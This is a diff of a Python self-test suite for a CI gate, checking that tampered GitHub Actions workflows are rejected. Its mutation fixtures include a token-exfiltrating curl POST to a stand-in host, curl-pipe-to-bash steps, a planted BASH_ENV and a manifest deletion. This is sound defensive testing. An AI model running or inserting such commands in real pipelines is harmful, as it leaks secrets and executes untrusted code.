+            and publication_workflow_error(EXPECTED_WORKFLOW.replace(
+                "permissions:\n  contents: read\n", replacement, 1))
+            == "publication workflow top-level permissions are not exactly contents:read",
+        )
+    # These two needles were unreachable from every existing case, because their sibling cases
+    # expect the `job fields` diagnosis, which a list equality produces first. Trailing
+    # whitespace is the shape that reaches them: `job_fields` strips, so the line still matches
+    # the closed contract, while the needle is an exact substring and no longer does.
+    # Scoped to the publication block, because that is what the needle loop searches and
+    # `runs-on: ubuntu-24.04` occurs in sibling jobs too -- mutating the workflow's first
+    # occurrence would change a different job and prove nothing about this loop.
+    for label, line in (
+            ("pull-request job condition", "    if: github.event_name == 'pull_request'\n"),
+            ("runner", "    runs-on: ubuntu-24.04\n"),
+    ):
+        spaced_block = publication_block.replace(line, line.rstrip("\n") + " \n", 1)
+        expect(
+            f"publication workflow catches trailing whitespace on the {label} line",
+            publication_block.count(line) == 1 and spaced_block != publication_block
+            and publication_workflow_error(EXPECTED_WORKFLOW.replace(
+                publication_block, spaced_block, 1))
+            == f"publication workflow {label} is absent or duplicated",
+        )
+    for label, old, new, diagnosis in (
+        ("job condition", "    if: github.event_name == 'pull_request'\n",
+         "    if: always()\n", "job fields"),
+        ("runner", "    runs-on: ubuntu-24.04\n", "    runs-on: macos-15\n", "job fields"),
+        ("contents permission", "      contents: read\n", "      contents: write\n",
+         "permissions"),
+        ("pull-request permission", "      pull-requests: read\n",
+         "      pull-requests: write\n", "permissions"),
+        ("checkout action pin", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+         "actions/checkout@main", "pinned checkout action"),
+        ("checkout credential policy", "          persist-credentials: false\n",
+         "          persist-credentials: true\n", "checkout credentials"),
+        ("setup-python action pin",
+         "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+         "actions/setup-python@main", "pinned setup-python action"),
+        ("Python version", "          python-version: 3.13.14\n",
+         "          python-version: '3.x'\n", "Python version"),
+        ("GitHub token binding", "          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
+         "          GH_TOKEN: missing\n", "GitHub token binding"),
+        ("pull-request number binding",
+         "          PR_NUMBER: ${{ github.event.pull_request.number }}\n",
+         "          PR_NUMBER: 0\n", "pull-request number binding"),
+        ("pull-request head binding",
+         "          HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n",
+         "          HEAD_SHA: ${{ github.sha }}\n", "pull-request head binding"),
+        ("PR-scoped manifest",
+         '          MANIFEST="contracts/review/pr-$PR_NUMBER/frozen-publication.json"\n',
+         '          MANIFEST="contracts/review/pr-8/frozen-publication.json"\n',
+         "PR-scoped publication manifest"),
+        ("verifier executable", "python3 tools/verify-review-publication.py ",
+         "python3 tools/other.py ", "publication verifier executable"),
+        ("snapshot mode", "tools/verify-review-publication.py pr-snapshot",
+         "tools/verify-review-publication.py comment", "snapshot verifier mode"),
+        ("repository argument", '--repo "$GITHUB_REPOSITORY"', '--repo wrong/repo',
+         "repository argument"),
+        ("pull-request argument", '--pr "$PR_NUMBER"', '--pr 0',
+         "pull-request argument"),
+        ("head argument", '--expected-head "$HEAD_SHA"', '--expected-head deadbeef',
+         "head argument"),
+        ("manifest argument", '--manifest "$MANIFEST"', '--manifest missing.json',
+         "manifest argument"),
+    ):
+        expect(
+            f"publication workflow rejects a changed {label}",
+            publication_semantic_mutation(old, new, diagnosis),
+        )
+    expect(
+        "publication workflow retains the unregistered-PR manifest branch",
+        publication_semantic_mutation(
+            '          if [ ! -f "$MANIFEST" ]; then\n',
+            "", "unregistered-PR manifest branch"),
+    )
+    expect(
+        "publication workflow fails when a pull request has no frozen manifest",
+        publication_semantic_mutation(
+            '            exit 1\n',
+            '            exit 0\n', "unregistered-PR manifest exit"),
+    )
+    expect(
+        "publication workflow rejects an early success exit before the verifier",
+        publication_semantic_mutation(
+            '          fi\n'
+            '          python3 tools/verify-review-publication.py pr-snapshot ',
+            '          fi\n'
+            '          exit 0\n'
+            '          python3 tools/verify-review-publication.py pr-snapshot ',
+            "command sequence"),
+    )
+    expect(
+        "publication workflow rejects a skipped verification step",
+        publication_semantic_mutation(
+            "      - name: frozen publication still matches the live pull request\n",
+            "      - name: frozen publication still matches the live pull request\n"
+            "        if: false\n",
+            "step fields"),
+    )
+    expect(
+        "publication workflow rejects a non-blocking verification step",
+        publication_semantic_mutation(
+            "      - name: frozen publication still matches the live pull request\n",
+            "      - name: frozen publication still matches the live pull request\n"
+            "        continue-on-error: true\n",
+            "step fields"),
+    )
+    expect(
+        "publication workflow rejects a verifier whose failure is ignored",
+        publication_semantic_mutation(
+            '--expected-head "$HEAD_SHA" --manifest "$MANIFEST"\n',
+            '--expected-head "$HEAD_SHA" --manifest "$MANIFEST" || true\n',
+            "command sequence"),
+    )
+    expect(
+        "publication workflow rejects a backgrounded verifier",
+        publication_semantic_mutation(
+            '--expected-head "$HEAD_SHA" --manifest "$MANIFEST"\n',
+            '--expected-head "$HEAD_SHA" --manifest "$MANIFEST" &\n',
+            "command sequence"),
+    )
+    expect(
+        "publication workflow rejects a top-level environment or defaults override",
+        "top-level fields" in publication_workflow_error(
+            EXPECTED_WORKFLOW.replace(
+                "name: harness-check\n", "name: harness-check\nenv:\n  BASH_ENV: planted\n",
+                1)),
+    )
+    expect(
+        "publication workflow rejects an unexpected pre-verifier step",
+        publication_semantic_mutation(
+            "      - name: frozen publication still matches the live pull request\n",
+            "      - name: remove the frozen publication\n"
+            "        run: rm -f contracts/review/pr-8/frozen-publication.json\n"
+            "      - name: frozen publication still matches the live pull request\n",
+            "step inventory"),
+    )
+    expect(
+        "publication workflow rejects a bare-dash pre-verifier step",
+        publication_semantic_mutation(
+            "      - name: frozen publication still matches the live pull request\n",
+            "      -\n"
+            "        name: remove the frozen publication\n"
+            "        run: rm -f contracts/review/pr-8/frozen-publication.json\n"
+            "      - name: frozen publication still matches the live pull request\n",
+            "step inventory"),
+    )
+    for label, old, new, diagnosis in (
+        ("job-level non-blocking policy", "    runs-on: ubuntu-24.04\n",
+         "    continue-on-error: true\n    runs-on: ubuntu-24.04\n", "job fields"),
+        ("skipped checkout",
+         "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
+         "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+         "        if: false\n", "checkout step"),
+        ("non-blocking checkout", "        with:\n          persist-credentials: false\n",
+         "        continue-on-error: true\n        with:\n"
+         "          persist-credentials: false\n", "checkout step"),
+        ("redirected checkout", "          persist-credentials: false\n",
+         "          persist-credentials: false\n          path: nested\n", "checkout step"),
+        ("wrong checkout ref", "          persist-credentials: false\n",
+         "          persist-credentials: false\n          ref: main\n", "checkout step"),
+        ("skipped setup-python",
+         "      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97\n",
+         "      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97\n"
+         "        if: false\n", "setup-python step"),
+        ("non-blocking setup-python", "          python-version: 3.13.14\n",
+         "          python-version: 3.13.14\n        continue-on-error: true\n",
+         "setup-python step"),
+        ("extra verifier environment",
+         "          HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n",
+         "          HEAD_SHA: ${{ github.event.pull_request.head.sha }}\n"
+         "          BASH_ENV: planted\n", "verifier environment"),
+    ):
+        expect(
+            f"publication workflow rejects a {label}",
+            publication_semantic_mutation(old, new, diagnosis),
+        )
+    expect(
+        "ordinary full-gate checkout must retain the fixed decision-corpus base",
+        workflow_error(EXPECTED_WORKFLOW.replace("          fetch-depth: 0\n", "", 1))
+        is not None,
+    )
+    expect(
+        "the decision writer matches its independently reviewed source digest",
+        decision_writer_source_error() == "",
+    )
+    expect(
+        "changing the decision writer invalidates its source binding",
+        decision_writer_source_error(
+            DECISION_WRITER.read_bytes() + b"\n# planted source drift\n") != "",
+    )
+    retained_probe = _json_without_duplicate_keys(RETAINED_DECISION_COMMANDS)
+    expect(
+        "the retained decision manifest matches the closed command inventory",
+        retained_decision_commands_error(retained_probe) == "",
+    )
+    expect(
+        "a retained decision command cannot disappear self-consistently",
+        retained_decision_commands_error(dict(
+            retained_probe, commands=retained_probe["commands"][:-1])) != "",
+    )
+    decision_writer_spec = importlib.util.spec_from_file_location(
+        "_ci_gate_topology_probe", DECISION_WRITER)
+    decision_writer = importlib.util.module_from_spec(decision_writer_spec)
+    decision_writer_spec.loader.exec_module(decision_writer)
+    topology_calls = []
+
+    def base_only_runner(argv, **_kwargs):
+        topology_calls.append(tuple(argv))
+        return subprocess.CompletedProcess(argv, 0, "", "")
+
+    original_decision_runner = decision_writer.subprocess.run
+    decision_writer.subprocess.run = base_only_runner
+    try:
+        decision_writer.base_and_worktree_fixture_commands()
+    finally:
+        decision_writer.subprocess.run = original_decision_runner
+    expect(
+        "decision corpus derivation reads the fixed base but never branch HEAD history",
+        len(topology_calls) == len(decision_writer.SOURCES)
+        and all(call[-2] == "show"
+                and call[-1].startswith(decision_writer.BASE + ":")
+                for call in topology_calls),
+    )
+    expect(
+        "mutation workflow baseline matches exact contract",
+        workflow_error(EXPECTED_WORKFLOW, EXPECTED_MUTATION_WORKFLOW) is None,
+    )
+    expect(
+        "mutation workflow rejects a merge-ref checkout",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "          ref: ${{ github.event.pull_request.head.sha "
+                "|| github.sha }}\n", "", 1),
+        ) is not None,
+    )
+    # The sweep is the only check that can tell a truthful receipt from a self-consistent
+    # forgery, so every accepted head must execute all six shards. A selector or job-level
+    # condition would make the result depend on an unproved base run and mutable runner state.
+    expect(
+        "mutation workflow carries no path filter that would silence a head",
+        "paths:" not in EXPECTED_MUTATION_WORKFLOW
+        and "paths-ignore:" not in EXPECTED_MUTATION_WORKFLOW,
+    )
+    expect(
+        "a path-ignore selector over runtime inputs is rejected",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "  pull_request:\n",
+                "  pull_request:\n"
+                "    paths-ignore: [settings.json, hooks/hooks.json]\n",
+                1),
+        ) is not None,
+    )
+    expect(
+        "mutation shards cannot gain a job-level selector",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "  mutations:\n", "  mutations:\n    if: false\n", 1),
+        ) is not None,
+    )
+    expect(
+        "mutation workflow retains all six shards",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "        shard: [0, 1, 2, 3, 4, 5]\n",
+                "        shard: [0, 1, 2, 3, 4]\n", 1),
+        ) is not None,
+    )
+    expect(
+        "shard commands retain the six-way assignment",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace("--shard-count 6", "--shard-count 5", 1),
+        ) is not None,
+    )
+    expect(
+        "shard commands retain the exact-head fence",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "          --expected-head '${{ github.event.pull_request.head.sha "
+                "|| github.sha }}'\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "mutation workflow binds its head on every event it accepts",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace("|| github.sha ", "", 1),
+        ) is not None,
+    )
+    expect(
+        "mutation aggregator must run even when a shard fails",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace("    if: always()\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "mutation aggregate depends on the shards",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace("    needs: mutations\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "a head whose shards did not all succeed is refused",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "        if: needs.mutations.result != 'success'\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "fragment upload fails when a shard writes no evidence",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace("          if-no-files-found: error\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "aggregate retains artifact download",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "      - uses: actions/download-artifact@"
+                "d3f86a106a0bac45b974a628896c90dbdf5c8093\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "aggregate retains tracked-receipt comparison",
+        workflow_error(
+            EXPECTED_WORKFLOW,
+            EXPECTED_MUTATION_WORKFLOW.replace(
+                "          --aggregate mutation-fragments/*.json\n", "", 1),
+        ) is not None,
+    )
+    expect(
+        "mutation workflow has no inheritance or scope-selector mode",
+        all(term not in EXPECTED_MUTATION_WORKFLOW for term in (
+            "resweep", "verify-inherited", "needs.scope", "scope:")),
+    )
+    expect(
+        "mutation workflow authority baseline matches its independent semantic contract",
+        mutation_workflow_authority_error(EXPECTED_MUTATION_WORKFLOW) == "",
+    )
+
+    def coordinated_sweep_mutation(mutated, diagnosis, *, exact=False):
+        """Move the byte oracle with a changed sweep workflow; authority must still red."""
+        original = EXPECTED_MUTATION_WORKFLOW
+        globals()["EXPECTED_MUTATION_WORKFLOW"] = mutated
+        try:
+            problem = mutation_workflow_authority_error(mutated)
+            return (mutated != original
+                    and workflow_error(EXPECTED_WORKFLOW, mutated) is None
+                    and (problem == diagnosis if exact else diagnosis in problem))
+        finally:
+            globals()["EXPECTED_MUTATION_WORKFLOW"] = original
+
+    def sweep_replacement(old, new):
+        """Return the sweep workflow with one uniquely located edit, else an unchanged copy."""
+        if EXPECTED_MUTATION_WORKFLOW.count(old) != 1:
+            return EXPECTED_MUTATION_WORKFLOW
+        return EXPECTED_MUTATION_WORKFLOW.replace(old, new, 1)
+
+    def sweep_job_replacement(header, old, new):
+        """Return the sweep workflow with one edit confined to a single job block.
+
+        The bootstrap step, the pinned actions, and the head reference each occur once per
+        job, so a first-occurrence edit would silently move the other job and prove nothing
+        about the one the case names.
+        """
+        block = _yaml_mapping_block(EXPECTED_MUTATION_WORKFLOW, header)
+        if not block or block.count(old) != 1:
+            return EXPECTED_MUTATION_WORKFLOW
+        return EXPECTED_MUTATION_WORKFLOW.replace(block, block.replace(old, new, 1), 1)
+
+    def sweep_duplicated_job(header):
+        """Return the sweep workflow with one job block emitted twice."""
+        block = _yaml_mapping_block(EXPECTED_MUTATION_WORKFLOW, header)
+        if not block:
+            return EXPECTED_MUTATION_WORKFLOW
+        return EXPECTED_MUTATION_WORKFLOW.replace(block, block + block, 1)
+
+    sweep_exfil_job = (
+        "  exfil:\n    runs-on: ubuntu-24.04\n"
+        "    permissions:\n      contents: write\n    steps:\n"
+        '      - run: curl -X POST -d "$GITHUB_TOKEN" https://example.invalid/collect\n')
+    sweep_head_ref = (
+        "          ref: ${{ github.event.pull_request.head.sha || github.sha }}\n")
+    sweep_head_assertion = (
+        "          git rev-parse HEAD | grep -Fx "
+        "'${{ github.event.pull_request.head.sha || github.sha }}'\n")
+    # Exact diagnoses, not merely non-empty. These six are the widened-token and appended-job
+    # shapes that reached a green gate, and a substring over thirty non-empty return paths
+    # lets the branch each one names be neutralised while an unrelated fallback keeps the
+    # assertion true.
+    for label, mutated, diagnosis in (
+        ("top-level permissions widened to write",
+         sweep_replacement("permissions:\n  contents: read\n",
+                           "permissions:\n  contents: write\n"),
+         "mutation workflow top-level permissions are not exactly contents:read"),
+        ("top-level permissions granted an extra scope",
+         sweep_replacement("permissions:\n  contents: read\n",
+                           "permissions:\n  contents: read\n  pull-requests: write\n"),
+         "mutation workflow top-level permissions are not exactly contents:read"),
+        ("a write-scoped sibling job appended after the aggregator",
+         EXPECTED_MUTATION_WORKFLOW + sweep_exfil_job,
+         "mutation workflow job inventory is not exactly closed"),
+        ("a write-scoped sibling job inserted before the aggregator",
+         sweep_replacement("  aggregate:\n", sweep_exfil_job + "  aggregate:\n"),
+         "mutation workflow job inventory is not exactly closed"),
+        ("a duplicated shard job", sweep_duplicated_job("  mutations:"),
+         "mutation shard job is absent or duplicated"),
+        ("a duplicated aggregate job", sweep_duplicated_job("  aggregate:"),
+         "mutation aggregate job is absent or duplicated"),
+    ):
+        expect(
+            f"coordinated sweep bytes cannot hide {label}",
+            coordinated_sweep_mutation(mutated, diagnosis, exact=True),
+        )
+    for label, mutated, diagnosis in (
+        ("a top-level environment or defaults override",
+         sweep_replacement("name: mutation-proof\n",
+                           "name: mutation-proof\nenv:\n  BASH_ENV: planted\n"),
+         "top-level fields"),
+        ("an absent pull-request trigger",
+         sweep_replacement("  pull_request:\n", ""), "trigger inventory"),
+        ("a filtered pull-request trigger",
+         sweep_replacement("  pull_request:\n",
+                           "  pull_request:\n    paths: [README.md]\n"),
+         "pull_request trigger is filtered"),
+        ("a filtered workflow_dispatch trigger",
+         sweep_replacement("  workflow_dispatch:\n",
+                           "  workflow_dispatch:\n    inputs:\n      skip: {}\n"),
+         "workflow_dispatch trigger is filtered"),
+        ("a redirected push branch",
+         sweep_replacement("    branches: [main]\n", "    branches: [other]\n"),
+         "push trigger is not exactly main"),
+        ("shard write authority",
+         sweep_replacement("  mutations:\n    strategy:\n",
+                           "  mutations:\n    permissions:\n      contents: write\n"
+                           "    strategy:\n"),
+         "mutation shard job fields"),
+        ("aggregate write authority",
+         sweep_replacement("  aggregate:\n    if: always()\n",
+                           "  aggregate:\n    permissions:\n      contents: write\n"
+                           "    if: always()\n"),
+         "mutation aggregate job fields"),
+        ("a shard strategy that stops at the first failure",
+         sweep_replacement("      fail-fast: false\n", ""), "mutation shard strategy"),
+        ("a dropped shard",
+         sweep_replacement("        shard: [0, 1, 2, 3, 4, 5]\n",
+                           "        shard: [0, 1, 2, 3, 4]\n"),
+         "mutation shard matrix"),
+        ("a step inserted into the shard job",
+         sweep_job_replacement("  mutations:", "      - name: run mutation shard\n",
+                               "      - run: curl -sS https://example.invalid/x | bash\n"
+                               "      - name: run mutation shard\n"),
+         "mutation shard step inventory"),
+        ("a floating shard checkout action",
+         sweep_job_replacement(
+             "  mutations:", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+             "actions/checkout@main"),
+         "mutation shard step inventory"),
+        ("a step inserted into the aggregate job",
+         sweep_job_replacement(
+             "  aggregate:",
+             "      - name: refuse a head whose shards did not all succeed\n",
+             "      - run: curl -sS https://example.invalid/x | bash\n"
+             "      - name: refuse a head whose shards did not all succeed\n"),
+         "mutation aggregate step inventory"),
+        ("a shard checkout of a ref other than the accepted head",
+         sweep_job_replacement("  mutations:", sweep_head_ref, "          ref: main\n"),
+         "mutation shard checkout step"),
+        ("an aggregate checkout of a ref other than the accepted head",
+         sweep_job_replacement("  aggregate:", sweep_head_ref, "          ref: main\n"),
+         "mutation aggregate checkout step"),
+        ("a floating shard interpreter version",
+         sweep_job_replacement("  mutations:", "          python-version: 3.13.14\n",
+                               "          python-version: '3.x'\n"),
+         "mutation shard setup-python step"),
+        ("a non-blocking shard bootstrap step",
+         sweep_job_replacement("  mutations:", "        timeout-minutes: 10\n",
+                               "        timeout-minutes: 10\n"
+                               "        continue-on-error: true\n"),
+         "mutation shard zsh step fields"),
+        ("a shard bootstrap that no longer asserts the accepted head",
+         sweep_job_replacement("  mutations:", sweep_head_assertion, ""),
+         "mutation shard zsh command sequence"),
+        ("a shell line added to the shard bootstrap",
+         sweep_job_replacement("  mutations:", "          zsh --version\n",
+                               "          zsh --version\n"
+                               "          curl -sS https://example.invalid/x | bash\n"),
+         "mutation shard zsh command sequence"),
+        ("a non-blocking shard receipt step",
+         sweep_replacement("      - name: run mutation shard\n        run: >-\n",
+                           "      - name: run mutation shard\n"
+                           "        continue-on-error: true\n        run: >-\n"),
+         "mutation shard receipt step fields"),
+        ("a changed shard count",
+         sweep_replacement("          --shard-count 6\n", "          --shard-count 5\n"),
+         "mutation shard receipt command"),
+        ("a shard that uploads no evidence",
+         sweep_replacement("          if-no-files-found: error\n", ""),
+         "mutation shard fragment upload"),
+        ("an aggregator that no longer refuses a failed shard",
+         sweep_replacement("        if: needs.mutations.result != 'success'\n", ""),
+         "mutation aggregate shard-failure gate fields"),
+        ("a shard-failure refusal that exits zero",
+         sweep_job_replacement("  aggregate:", "          exit 1\n",
+                               "          exit 0\n"),
+         "mutation aggregate shard-failure gate does not exit non-zero"),
+        ("a narrowed fragment download",
+         sweep_replacement("          pattern: mutation-fragment-*\n",
+                           "          pattern: mutation-fragment-0*\n"),
+         "mutation aggregate fragment download"),
+        ("a non-blocking receipt comparison step",
+         sweep_replacement(
+             "      - name: reject incomplete evidence and compare the tracked receipt\n"
+             "        run: >-\n",
+             "      - name: reject incomplete evidence and compare the tracked receipt\n"
+             "        continue-on-error: true\n        run: >-\n"),
+         "mutation aggregate comparison step fields"),
+        ("a receipt comparison over one named fragment",
+         sweep_replacement("          --aggregate mutation-fragments/*.json\n",
+                           "          --aggregate mutation-fragments/one.json\n"),
+         "mutation aggregate comparison command"),
+        # YAML recognises no comment inside a block scalar, so a `#` line in a FOLDED
+        # command is content: folding joins it and the shell comments out the whole line.
+        # Dropping those lines the way a literal `run: |` block allows turned the sweep's
+        # receipt comparison into a no-op that exits zero, with this oracle reading the
+        # command it expected.
+        ("a comment line folded into the aggregate command",
+         sweep_replacement("          python3 tools/write-mutation-receipt.py\n"
+                           "          --aggregate mutation-fragments/*.json\n",
+                           "          # measurement disabled\n"
+                           "          python3 tools/write-mutation-receipt.py\n"
+                           "          --aggregate mutation-fragments/*.json\n"),
+         "mutation aggregate comparison command"),
+        ("a comment line folded into the shard command",
+         sweep_replacement(
+             "          --expected-head '${{ github.event.pull_request.head.sha "
+             "|| github.sha }}'\n",
+             "          # --expected-head '${{ github.event.pull_request.head.sha "
+             "|| github.sha }}'\n"),
+         "mutation shard receipt command"),
+    ):
+        expect(
+            f"coordinated sweep bytes cannot hide {label}",
+            coordinated_sweep_mutation(mutated, diagnosis),
+        )
+    expect(
+        "workflow source-bound bootstrap removal fails",
+        workflow_error(EXPECTED_WORKFLOW.replace(
+            "          python3 hooks/harness_check.py --ci\n", "", 1)) is not None,
+    )
+    expect("workflow gate command mutation fails", workflow_error(EXPECTED_WORKFLOW.replace(
         "python3 tools/ci-gate.py", "python3 hooks/harness_check.py --ci", 1
     )) is not None)
+    expect(
+        "workflow source-bound bootstrap must precede the complete gate",
+        workflow_error(EXPECTED_WORKFLOW.replace(
+            "          python3 hooks/harness_check.py --ci\n"
+            "          python3 tools/ci-gate.py\n",
+            "          python3 tools/ci-gate.py\n"
+            "          python3 hooks/harness_check.py --ci\n",
+            1)) is not None,
+    )
     expect("workflow unknown feature fails", workflow_error(EXPECTED_WORKFLOW + "permissions: {}\n") is not None)
     expect(
         "workflow permission widening fails",
@@ -325,21 +3595,1645 @@ def selftest() -> int:
         ) is not None,
     )
 
-    # SUITE_FLOORS and harness_check's SELFTEST_SUITES are two tables describing one
-    # contract. They had already drifted before this assertion existed, so bind them.
-    import importlib.util as _il
-    _spec = _il.spec_from_file_location("_hc", ROOT / "hooks/harness_check.py")
-    _hc = _il.module_from_spec(_spec)
-    _spec.loader.exec_module(_hc)
-    _harness_floors = {name: floor for name, _cmd, floor in _hc.SELFTEST_SUITES}
-    _drift = {
-        suite: (floor, _harness_floors.get(suite))
-        for suite, floor in SUITE_FLOORS.items()
-        if suite != "harness_check" and _harness_floors.get(suite) != floor
+    expect(
+        "gate floors agree with harness_check's imported registry",
+        floor_registry_error() == "",
+    )
+    expect(
+        "the executed harness matches its reviewed source digest",
+        harness_source_error() == "",
+    )
+    expect(
+        "changing the executed harness invalidates its source digest",
+        harness_source_error(
+            source_bytes=HARNESS_SOURCE.read_bytes() + b"# planted mutation\n") != "",
+    )
+    expect(
+        "the repository-ownership authority matches its reviewed source digest",
+        repository_ownership_source_error() == "",
+    )
+    expect(
+        "changing repository-ownership bytes invalidates its source digest",
+        repository_ownership_source_error(
+            source_bytes=REPOSITORY_OWNERSHIP_SOURCE.read_bytes()
+            + b"# planted mutation\n") != "",
+    )
+    source_registry = _json_without_duplicate_keys(SUITE_SOURCE_GOLDEN)
+    without_ownership = dict(source_registry)
+    without_ownership["suites"] = {
+        name: value for name, value in source_registry["suites"].items()
+        if name != "repository-ownership"
     }
     expect(
-        f"gate floors agree with harness_check's registry (drift: {_drift or 'none'})",
-        not _drift,
+        "removing the repository-ownership digest cannot disable its binding",
+        repository_ownership_source_error(golden_data=without_ownership) != "",
+    )
+    without_harness = dict(source_registry)
+    without_harness["suites"] = {
+        name: value for name, value in source_registry["suites"].items()
+        if name != "harness_check"
+    }
+    expect(
+        "removing the harness source digest is not permission to skip the binding",
+        harness_source_error(golden_data=without_harness) != "",
+    )
+    expect(
+        "the mutation generator matches its reviewed source digest",
+        mutation_generator_source_error() == "",
+    )
+    expect(
+        "editing the mutation generator invalidates its source digest",
+        mutation_generator_source_error(
+            source_bytes=(ROOT / "tools/write-mutation-receipt.py").read_bytes()
+            + b"# planted mutation\n") != "",
+    )
+    without_generator = dict(source_registry)
+    without_generator["suites"] = {
+        name: value for name, value in source_registry["suites"].items()
+        if name != "write-mutation-receipt"
+    }
+    expect(
+        "removing the generator source digest is not permission to skip the binding",
+        mutation_generator_source_error(golden_data=without_generator) != "",
+    )
+    expect("hook timeout and internal budget contract matches", hook_budget_error() == "")
+    def retime_bash_hook(data: dict, seconds: int) -> int:
+        """Set the Bash guard hook's timeout by identity, not by list position.
+
+        Indexing PreToolUse[0] assumed the Bash matcher comes first: reordering
+        settings.json so Agent|Task leads mutated the spawn guard instead, the contract
+        saw no change, and this check went red on an edit that changed nothing about the
+        hook it names.
+        """
+        touched = 0
+        for entry in data.get("hooks", {}).get("PreToolUse", []):
+            for hook in entry.get("hooks", []):
+                if "bash_command_guard.py" in hook.get("command", ""):
+                    hook["timeout"] = seconds
+                    touched += 1
+        return touched
+
+    settings_fixture = json.loads((ROOT / "settings.json").read_text(encoding="utf-8"))
+    settings_touched = retime_bash_hook(settings_fixture, 4)
+    expect(
+        "hook budget contract rejects a Claude timeout mutation",
+        settings_touched == 1 and hook_budget_error(settings_data=settings_fixture) != "",
+    )
+    codex_fixture = json.loads((ROOT / "hooks/hooks.json").read_text(encoding="utf-8"))
+    codex_touched = retime_bash_hook(codex_fixture, 4)
+    expect(
+        "hook budget contract rejects a Codex timeout mutation",
+        codex_touched == 1 and hook_budget_error(codex_data=codex_fixture) != "",
+    )
+    reordered = json.loads((ROOT / "settings.json").read_text(encoding="utf-8"))
+    reordered["hooks"]["PreToolUse"].reverse()
+    expect(
+        "hook budget contract is indifferent to PreToolUse ordering",
+        hook_budget_error(settings_data=reordered) == ""
+        and retime_bash_hook(reordered, 4) == 1
+        and hook_budget_error(settings_data=reordered) != "",
+    )
+    registered_commands = command_specs(ROOT / "selftest-render")
+    harness_commands = [
+        (argv, spec) for argv, spec in registered_commands
+        if spec.name == "harness-ci"
+    ]
+    observed_child_timeouts = []
+    original_subprocess_run = subprocess.run
+
+    def record_child_timeout(argv, **kwargs):
+        observed_child_timeouts.append((tuple(argv), kwargs.get("timeout")))
+        return subprocess.CompletedProcess(argv, 0, "", "")
+
+    subprocess.run = record_child_timeout
+    try:
+        for argv, _spec in registered_commands:
+            run_command(argv)
+    finally:
+        subprocess.run = original_subprocess_run
+    expect(
+        "the production registry contains exactly one full harness child",
+        len(harness_commands) == 1,
+    )
+    harness_argv = (
+        harness_commands[0][0]
+        if len(harness_commands) == 1
+        else [sys.executable, "hooks/harness_check.py", "--ci"]
+    )
+    harness_spec = harness_commands[0][1] if len(harness_commands) == 1 else None
+    observed_timeout_by_argv = dict(observed_child_timeouts)
+    expect(
+        "the registered full harness child receives its measured 240-second budget",
+        observed_timeout_by_argv.get(tuple(harness_argv)) == 240,
+    )
+    expect(
+        "every other registered child retains the 120-second default budget",
+        all(
+            timeout == 120
+            for argv, timeout in observed_child_timeouts
+            if argv != tuple(harness_argv)
+        ),
+    )
+    expect(
+        "a foreign executable with the harness argument tail retains the default budget",
+        child_timeout_seconds(
+            ["/not-the-python-runtime", "hooks/harness_check.py", "--ci"]
+        ) == 120,
+    )
+    expect(
+        "extra harness arguments retain the default budget",
+        child_timeout_seconds([*harness_argv, "--extra"]) == 120,
+    )
+    timed_out = run_command([sys.executable, "-c",
+                             "import time; time.sleep(0.3)"])
+    expect("a child that runs to completion is not reported as a timeout",
+           timed_out.returncode == 0 and "exceeded" not in timed_out.stderr)
+    original_child_timeout = DEFAULT_CHILD_TIMEOUT_SECONDS
+    globals()["DEFAULT_CHILD_TIMEOUT_SECONDS"] = 0.2
+    try:
+        slow = run_command([sys.executable, "-c", "import time; time.sleep(3)"])
+    finally:
+        globals()["DEFAULT_CHILD_TIMEOUT_SECONDS"] = original_child_timeout
+    expect(
+        "a child that exceeds its timeout becomes a receipt failure, not a traceback",
+        slow.returncode != 0 and "exceeded" in slow.stderr,
+    )
+
+    def text_timeout(_argv, **_kwargs):
+        raise subprocess.TimeoutExpired(
+            cmd="probe", timeout=1, stderr="partial text stderr")
+
+    subprocess.run = text_timeout
+    try:
+        text_timeout_result = run_command([sys.executable, "probe.py"])
+    finally:
+        subprocess.run = original_subprocess_run
+    expect(
+        "a text-mode timeout stderr remains a receipt failure instead of raising",
+        text_timeout_result.returncode == 1
+        and "partial text stderr" in text_timeout_result.stderr,
+    )
+
+    def byte_timeout(_argv, **_kwargs):
+        raise subprocess.TimeoutExpired(
+            cmd="harness-ci", timeout=240, stderr=b"\xffpartial bytes")
+
+    subprocess.run = byte_timeout
+    try:
+        byte_timeout_result = run_command(harness_argv)
+    finally:
+        subprocess.run = original_subprocess_run
